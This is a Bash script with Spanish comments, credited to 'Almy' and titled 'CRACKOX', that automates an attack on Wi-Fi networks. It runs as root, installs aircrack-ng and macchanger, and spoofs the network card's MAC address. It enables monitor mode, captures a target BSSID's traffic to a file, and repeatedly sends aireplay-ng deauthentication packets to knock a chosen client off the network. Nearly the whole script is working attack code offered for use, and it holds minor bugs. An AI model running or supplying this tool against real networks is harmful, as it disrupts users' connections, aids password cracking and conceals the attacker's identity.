

#!/bin/bash
# color
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
LIGHT_GRAY='\033[0;90m'
GRAY='\033[1;30m'
RESET='\033[0m'

echo -e "\n${GRAY}Author Almy${RESET}\n"

echo -e "${RED} 
                     ▄████▄  ██▀███   ▄▄▄       ▄████▄  ██ ▄█▀ ▒█████  ▒██   ██▒ ▒ ████▒ ▒ ████▒                
                    ▒██▀ ▀█ ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█  ██▄█▒ ▒██▒  ██▒▒▒ █ █ ▒░▒▓██    ▒▓██                    
                    ▒▓█    ▄▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄▓███▄░ ▒██░  ██▒░░  █   ░░▒████  ░▒████                  
                    ▒▓▓▄ ▄██▒██▀▀█▄  ░██▄▄▄▄██▒▒▓▓▄ ▄██▓██ █▄ ▒██   ██░ ░ █ █ ▒ ░░▓█▒   ░░▓█▒                   
                    ▒ ▓███▀ ░██▓ ▒██▒ ▓█   ▓██░▒ ▓███▀ ▒██▒ █▄░ ████▓▒░▒██▒ ▒██▒ ░▒█░    ░▒█░                   
                    ░ ░▒ ▒  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ▒ ▒▒ ▓▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░  ▒ ░     ▒ ░                   
                      ░  ▒    ░▒ ░ ▒   ░   ▒▒    ░  ▒  ░ ░▒ ▒░  ░ ▒ ▒░ ░░   ░▒ ░  ░       ░                     
                    ░         ░░   ░   ░   ▒   ░       ░ ░░ ░ ░ ░ ░ ▒   ░    ░    ░ ░     ░ ░                   
                    ░ ░        ░           ░   ░ ░     ░  ░       ░ ░   ░    ░                                  

${RESET}"

# Funcion para verificar si el usuario es root

function check_root(){
  if [ "$(id -u)" !=  "0" ]; then
    echo -e "${YELLOW}[*] Este programa debe ser ejecutado como root.${RESET}\n"
    exit 1
  fi
}

check_root


# Esto evita que pacman pida confimacion al instalar paquetes
export PKGEXT=.pkg.tar 

# Funcion para verificar y/o instalar dependencias
function dependencies(){
  dependencies=(aircrack-ng macchanger)

  echo -e "\n${YELLOW}[*] Comprobando programas necesarios....${RESET}"
  sleep 2

  for program in "${dependencies[@]}"; do
    echo -ne "\n${BLUE}[*] Herramientas $program...${RESET}"

    if command -v "$program" &>/dev/null; then
      echo -e " (V)"
    else
      echo -e " (X)\n"
      echo -e "\n${BLUE} Instalando herramientas $program.....${RESET}\n"
      pacman -S --noconfirm "$program" > /dev/null 2>&1 # Instalacion no interactica de paquetes
    fi
    sleep 1
  done
}

# Funcion para cambiar la direccion MAC

function change_mac_address(){
  local networkCard="$1"

  if [ -z "$networkCard" ]; then
    echo -e "\n${RED}Error: No se proporciono la tarjeta de red.${RESET}\n"
    exit 1
  fi

  echo -e "\n${RED}Cambiando la direccion MAC de la tarjeta de red $networkCard.....${RESET}\n"
  macchanger -s "$networkCard"
  echo -e "\n${MAGENTA}Direccion MAC cambiada.${RESET}\n"

}

# Funcion para iniciar airmon-ng
function start_airmon() {
  local networkCard="$1"

  echo -e "\n${MAGENTA}Iniciando airmon-ng en la tarjeta de red $networkCard....${RESET}\n"
  airmon-ng start "$networkCard"
}


# comprobar dependencias
dependencies

echo

# cambiar la direccion MAC
read -p "Ingrese el nombre de la tarjeta de red: " networkCard
change_mac_address "$networkCard"

# Iniciar Airmon-ng

start_airmon "$networkCard"


# Creamos la funcion para iniciar Airodump-ng

function Start_airodump() {
  # Parametros de Airodump-ng
  local networkCard="$1"
  local channel="$2"
  local bssid="$3"
  local output_file="$4"

  echo -e "\n${CYAN}Iniciando Airodump-ng en la tarjeta de red $networkCard.....${RESET}\n"
  airodump-ng "$networkCard"
  airodump_PID=$!
  
  # Espera a que el proceso identificado por $airodump_PID finalice y redirige el flujo de error a /dev/null
  wait $airodump_PID 2>/dev/null

  echo -e "\n${CYAN}Airodump-ng se ha cerrado....${RESET}\n"
}

Start_airodump "$networkCard"

# Pedir al usuario los valores del canal, BSSID, nombre del archivo

read -p "Ingrese el canal: " channel

read -p "Ingrese el BSSID: " bssid

read -p "Ingrese el nombre del archivo de salida: " output_file

airodump-ng -c "$channel" --bssid "$bssid" -w "$output_file" "$networkCard"


# Iniciamos el Aireplay

function init_aireplay() {
  local continue_program="1"

  while [ "$continue_program" = "1" ]; do
    aireplay-ng -0 10 -e "$1" -a "$2" -c "$3" "$4" &
    aireplay_PID=$!
    wait "$aireplay_PID"
    read -p "¿Desea seguir con la misma direccion MAC? (1 = yes, 2 = no): " continue_program
  done
}



# Uso:

read -p "Ingrese la direccion MAC de la red: " mac


read -p "Ingrese la direccion MAC del cliente: " client_mac

init_aireplay "$name" "$mac" "$client_mac" "$networkCard"


